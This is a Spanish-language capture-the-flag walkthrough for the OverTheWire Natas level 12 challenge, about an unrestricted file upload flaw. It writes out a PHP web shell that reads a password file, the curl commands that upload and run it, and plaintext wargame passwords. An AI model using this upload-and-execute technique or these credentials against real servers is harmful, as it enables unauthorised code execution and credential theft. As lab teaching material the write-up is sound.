# Natas Level12

## Descripción
> **Level Goal (natas12.natas.labs.overthewire.org):** Un formulario permite subir una "JPEG" de máximo 1KB. El nombre final del archivo es aleatorio, pero conserva la extensión del nombre original enviado en el campo oculto `filename`.

## Solución
El código del servidor (visible en `index-source.html`) solo valida el tamaño del archivo (`filesize(...) > 1000`); no valida en absoluto el tipo de contenido ni fuerza una extensión concreta — usa `pathinfo($fn, PATHINFO_EXTENSION)` sobre el valor de `filename` que nosotros mismos controlamos en el POST. Basta con subir un archivo PHP con código que lea la contraseña.

```bash
cat > shell12.php <<'EOF'
<?php passthru("cat /etc/natas_webpass/natas13"); ?>
EOF

curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
  -F "filename=shell.php" \
  -F "MAX_FILE_SIZE=1000" \
  -F "uploadedfile=@shell12.php" \
  http://natas12.natas.labs.overthewire.org/index.php
# The file <a href="upload/lherx24eyx.php">upload/lherx24eyx.php</a> has been uploaded

curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
  http://natas12.natas.labs.overthewire.org/upload/lherx24eyx.php
# g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```

## Notas adicionales
- El nombre de archivo final es aleatorio (`genRandomString()` + la extensión de `filename`), pero la respuesta del propio servidor nos devuelve la ruta completa donde quedó guardado, así que no hace falta adivinarlo.
- La restricción de tamaño (1000 bytes) no es un obstáculo: un one-liner de PHP que llama a `passthru()` cabe de sobra.

## Referencias
- Reto original: http://natas12.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload (OWASP, subida de archivos sin restricción de tipo)
